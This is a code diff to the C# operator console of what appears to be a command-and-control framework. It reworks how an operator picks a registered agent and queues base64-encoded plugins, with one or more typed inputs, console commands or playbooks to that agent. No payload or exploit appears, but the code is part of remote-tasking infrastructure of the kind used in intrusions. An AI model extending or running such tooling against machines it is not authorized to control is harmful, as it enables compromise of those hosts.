@@ -130,6 +130,14 @@ __________                   __               __       _____
             }
         }
         public int SetCommand(){
+            //take the user through adding commands to registered clients
+
+            var prompt = AnsiConsole.Prompt(
+                new SelectionPrompt<string>()
+                    .Title("Select the client you would like to send a command to")
+                    .PageSize(10)
+                    .AddChoices(ListClients())
+            );
 
             //prevent user from running plugins or playbooks if they dont exist
             string[] options = null;
@@ -148,12 +156,6 @@ __________                   __               __       _____
                     .PageSize(10)
                     .AddChoices(options)
             );
-            var prompt = AnsiConsole.Prompt(
-                new SelectionPrompt<string>()
-                    .Title("Select the client you would like to send a command to")
-                    .PageSize(10)
-                    .AddChoices(ListClients())
-            );
 
             if(firstprompt == "Console Command"){
                 if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
@@ -168,7 +170,7 @@ __________                   __               __       _____
             } else if(firstprompt == "Plugin") {
                 string thirdprompt = "";
                 string fourthprompt = "";
-                string input = "";
+                string[] input = null;
                 if (ListPlugins().Length != 0){
                     thirdprompt = AnsiConsole.Prompt(
                         new SelectionPrompt<string>()
@@ -176,21 +178,28 @@ __________                   __               __       _____
                             .PageSize(10)
                             .AddChoices(ListPlugins())
                     );
-                    fourthprompt = AnsiConsole.Prompt(
-                        new SelectionPrompt<string>()
-                            .Title("Provide plugin input? ")
-                            .PageSize(10)
-                            .AddChoices(new [] {"Yes", "No"})
-                    );
-                    if (fourthprompt == "Yes"){
-                        input = AnsiConsole.Ask<string>("Enter plugin [red]input:[/] ");
+                    //save selected plugin to a variable
+                    var plugin = this.listener.pluginDict[thirdprompt];
+                    //get input depending on how many inputs the plugins need
+                    int ccount = Int32.Parse(plugin.Commands);
+                    if(ccount > 0){
+                        input = new string[ccount];
+
+                        var commandmsg = new Table();
+                        commandmsg.AddColumn($"This plugin requires {plugin.Commands} input(s).");
+                        AnsiConsole.Write(commandmsg);
+
+                        for(int x = 0; x < ccount; x++){
+                            input[x] = AnsiConsole.Ask<string>($"Enter plugin [red]input[/] [blue]{x+1}:[/]");
+                        }
+
                     }
 
                     if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                         //add plugin to command que
                         //should add the specific function to be run by the plugin
                         //but that's for later
-                        agent.commandQue.AddLast(new string[]{this.listener.Base64EncodeFile(this.listener.pluginDict[thirdprompt]), "plugin", input});
+                        agent.commandQue.AddLast(new dynamic[]{this.listener.Base64EncodeFile(plugin.Path), "plugin", input});
                         Console.WriteLine("\n");
                         return 0;
                     } else {
@@ -216,7 +225,7 @@ __________                   __               __       _____
                         foreach (Playbook.playbookCommand p in pb.playbookQue){
                             if (p.type == "plugin"){
                                 //add a plugin if it is a plugin
-                                agent.commandQue.AddLast(new string[]{this.listener.Base64EncodeFile(this.listener.pluginDict[p.command.Key]), p.type});
+                                agent.commandQue.AddLast(new string[]{this.listener.Base64EncodeFile(this.listener.pluginDict[p.command.Key].Path), p.type});
                             } else if (p.type == "command"){
                                 //add a command if it is a command
                                 string[] c_command = {p.command.Key, "console"};
